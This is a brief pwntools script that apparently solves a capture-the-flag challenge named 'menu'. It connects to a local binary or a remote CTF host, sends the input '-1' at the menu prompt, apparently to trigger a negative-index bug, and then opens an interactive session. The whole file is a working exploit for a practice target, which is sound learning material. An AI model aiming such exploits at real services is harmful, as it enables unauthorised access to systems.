from pwn import *

EXE = ELF("./challenge/menu")

def conn(useEXE=True):
    if useEXE:
        r = process([EXE.path])
    else:
        r = remote("chall.pwnoh.io", 13371)
    return r

context.binary = EXE
context.log_level = "DEBUG"

io = conn(False)

io.recvuntil("Quit\n")
io.sendline("-1")
io.interactive()

io.close()